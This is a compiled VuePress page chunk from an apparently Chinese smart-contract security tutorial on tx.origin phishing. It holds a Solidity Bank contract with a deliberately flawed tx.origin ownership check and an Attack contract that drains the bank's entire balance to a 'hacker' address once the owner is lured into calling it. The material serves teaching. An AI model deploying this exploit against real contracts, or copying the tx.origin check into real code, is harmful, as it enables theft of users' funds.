import{_ as a,K as t,L as e,a5 as p,M as n,N as o,W as c,F as i}from"./framework-edebdfe1.js";const l={},u=n("h1",{id:"钓鱼攻击",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#钓鱼攻击","aria-hidden":"true"},"#"),o(" 钓鱼攻击")],-1),k=c(`<div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>

<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.17</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Bank</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span><span class="token comment">//记录合约的拥有者</span>

    <span class="token comment">//在创建合约时给 owner 变量赋值</span>
    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token comment">//检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">==</span> owner<span class="token punctuation">,</span> <span class="token string">&quot;Not owner&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//转账ETH</span>
        <span class="token punctuation">(</span><span class="token builtin">bool</span> sent<span class="token punctuation">,</span> <span class="token punctuation">)</span> <span class="token operator">=</span> _to<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span> _amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>sent<span class="token punctuation">,</span> <span class="token string">&quot;Failed to send Ether&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span>
    <span class="token comment">// 受益者地址</span>
    <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> hacker<span class="token punctuation">;</span>
    <span class="token comment">// Bank合约地址</span>
    Bank bank<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span>Bank _bank<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//强制将address类型的_bank转换为Bank类型</span>
        bank <span class="token operator">=</span> <span class="token function">Bank</span><span class="token punctuation">(</span>_bank<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//将受益者地址赋值为部署者地址</span>
        hacker <span class="token operator">=</span> <span class="token keyword">payable</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token comment">//诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中</span>
        bank<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>hacker<span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">(</span>bank<span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function d(r,v){const s=i("DocsAD");return t(),e("div",null,[u,p(s),k])}const b=a(l,[["render",d],["__file","txorigin.html.vue"]]);export{b as default};
